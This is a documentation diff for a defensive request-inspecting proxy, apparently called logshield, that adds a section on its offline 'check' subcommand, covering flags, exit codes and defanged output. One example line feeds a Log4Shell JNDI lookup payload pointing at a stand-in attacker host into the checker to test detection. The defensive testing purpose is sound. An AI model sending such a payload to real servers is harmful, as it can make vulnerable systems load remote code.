@@ -26,6 +26,43 @@ logshield -upstream http://10.0.0.5:8080 -listen 127.0.0.1:8080 -mode block
 | `-log-level` | `info` | `debug`, `info`, `warn`, `error`. |
 | `-config`, `-check-config`, `-disable-rule` | | File-based configuration, validation, rule tuning: see [configuration](configuration.md). |
 
+## Explaining a verdict: `logshield check`
+
+```
+logshield check [flags] PAYLOAD
+echo '${jndi:ldap://attacker.invalid/a}' | logshield check -
+```
+
+`check` builds a small request around the payload, runs the same engine with the
+same defaults as the proxy, and prints what it found: the verdict, whether block
+mode would reject it, and for every detection the rule, where it was found, which
+decoding steps revealed it, and the CVE. It makes no network connection and
+forwards nothing.
+
+| Flag | Default | Meaning |
+|---|---|---|
+| `-in` | `header` | Where the payload sits: `header`, `query`, `path`, `cookie` or `body`. |
+| `-name` | `User-Agent`, `q`, `s` | Header, query parameter or cookie name for `-in header`, `query` or `cookie`. |
+| `-json` | off | Print the result as JSON (`decision`, `would_block_in_block_mode`, `detections`, ...). |
+| `-block-suspicious` | off | Report whether strict block mode would also reject a suspicious verdict. |
+| `-disable-rule` | none | Switch off a non-mandatory rule, exactly as in the proxy. Repeatable. |
+
+The payload is placed exactly as given. Percent-encode it yourself if a real
+client would (`-in query '%24%7Bjndi:...'`), because the engine decodes the layers
+a real stack would.
+
+| Exit code | Meaning |
+|---|---|
+| `0` | Clean. |
+| `3` | Suspicious. |
+| `4` | Malicious, or the engine hit a resource limit and failed closed. |
+| `1` / `2` | Could not read the input / usage error. |
+
+Everything `check` prints about the payload is defanged (a dollar sign followed
+by a brace never appears), so its output can be pasted into a log or a ticket.
+Standard input is limited to 1 MiB. The text layout is meant for people and may
+change; the JSON field names and the exit codes are the parts to script against.
+
 **Monitor is the default** so a first deployment cannot break traffic. The
 process says so at startup. Use `-mode block` once the logs look right.
 
